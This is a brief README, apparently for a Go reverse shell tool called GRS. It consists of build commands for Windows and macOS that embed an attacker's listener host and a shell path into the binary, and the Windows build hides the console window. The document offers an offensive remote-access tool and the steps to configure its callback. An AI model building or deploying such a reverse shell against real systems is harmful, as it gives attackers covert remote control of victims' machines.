# GRS
### A Golang reverse shell


#### To build:

Windows:

$ go build -ldflags "-X 'main.host=**LHOST**' -X 'main.shell=**shell path**' -H windowsgui" "windows/GRS.go"



Darwin:

$ go build -ldflags "-X 'main.host=**LHOST**' -X 'main.shellPath=**shell path**'" "darwin/GRS.go"
